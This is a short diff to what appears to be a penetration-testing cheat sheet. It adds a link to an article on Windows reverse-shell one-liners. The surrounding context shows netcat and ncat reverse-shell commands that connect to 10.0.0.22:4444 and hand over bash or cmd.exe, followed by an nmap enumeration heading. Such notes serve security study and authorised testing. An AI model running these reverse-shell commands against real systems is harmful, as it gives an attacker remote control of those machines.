@@ -62,6 +62,8 @@ nc -nv 10.0.0.22 4444 -e /bin/bash
 ncat --exec cmd.exe
 ```
 
+https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
+
 ## Enumeration
 
 ### nmap
